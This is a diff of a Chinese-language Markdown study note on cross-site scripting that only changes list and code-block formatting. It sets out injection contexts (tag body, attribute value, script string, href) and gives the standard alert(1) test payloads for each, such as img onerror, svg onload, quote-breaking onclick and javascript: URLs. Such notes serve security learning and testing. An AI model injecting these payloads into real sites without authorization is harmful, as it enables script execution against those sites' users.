@@ -68,50 +68,49 @@ tags:
 
 - **01 HTML标签之间**
 
-  - ```html
-    <div>你的输入</div>
-    ```
+  ```html
+  <div>你的输入</div>
+  ```
 
-  - ```html
-    <script>alert(1)</script>
-    <img src=x onerror=alert(1)>
-    <svg onload=alert(1)>
-    ```
-
-    > 标准Payload
+  ```html
+  <script>alert(1)</script>
+  <img src=x onerror=alert(1)>
+  <svg onload=alert(1)>
+  ```
+  
+  > 标准Payload
 
 - **02 HTML属性值内**
 
-  - ```html
-    <input value="你的输入">
-    ```
+  ```html
+   <input value="你的输入">
+  ```
 
-  - ```html
-    " onclick=alert(1) "
-    ```
-
-    > 思路: 用" 闭合value属性, 用事件触发
+  ```html
+  " onclick=alert(1) "
+  ```
+  > 思路: 用" 闭合value属性, 用事件触发
 
 - **03 JavaScript代码内**
 
-  - ```js
-    <script>var name='你的输入';</script>
-    ```
+  ```js
+  <script>var name='你的输入';</script>
+  ```
 
-  - ```
-    '; alert(1); //
-    "; alert(1); //
-    ```
+  ```js
+  '; alert(1); //
+  "; alert(1); //
+  ```
 
 - **04 href属性内**
 
-  - ```js
-    <a href="你的输入">link</a>
-    ```
+  ```js
+  <a href="你的输入">link</a>
+  ```
 
-  - ```js
-    javascript:alert(1)
-    ```
+  ```js
+  javascript:alert(1)
+  ```
 
 ### 2.2 标准验证Payload
 
